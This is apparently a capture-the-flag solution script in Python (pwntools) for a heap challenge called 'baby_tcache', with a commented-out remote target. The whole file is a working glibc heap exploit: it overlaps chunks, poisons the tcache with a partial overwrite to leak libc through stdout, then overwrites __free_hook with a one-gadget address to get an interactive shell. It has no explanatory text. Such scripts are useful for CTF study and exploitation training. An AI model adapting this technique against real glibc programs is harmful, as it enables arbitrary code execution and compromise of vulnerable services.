#!/usr/bin/env python
# coding=utf-8
from pwn import *

r = process(["./baby_tcache"])
#r = remote("52.68.236.186", 56746)
def add(size,data):
        r.sendlineafter("choice:","1")
        r.sendlineafter(":",str(size))
        r.sendafter(":",data)

def remove(idx):
        r.sendlineafter("choice:","2")
        r.sendlineafter(":",str(idx))

add(0x500,"a") #0
add(0x20,"a")  #1
add(0x20,"a")  #2
add(0x4f0,"a")  #3
add(0xf0,"a")  #4
remove(2)
add(0x28,"a"*0x20+p64(0x570)) #2
remove(0)
remove(3)
remove(1)
add(0x500,"a") #0
add(0x100,p16(0x4760)) #1
add(0x20,"a") #3
add(0x20,p64(0x800)+"\x00"*0x9) #5

data = r.recvuntil("$")
libc = u64(data[8:16])-0x3ed8b0
print hex(libc)
remove(3)
remove(1)
gdb.attach(r)
add(0x100,p64(libc+0x3ed8e8))
add(0x100,p64(0x1234))
add(0x100,p64(libc+0x4f322))
remove(0)
r.interactive()
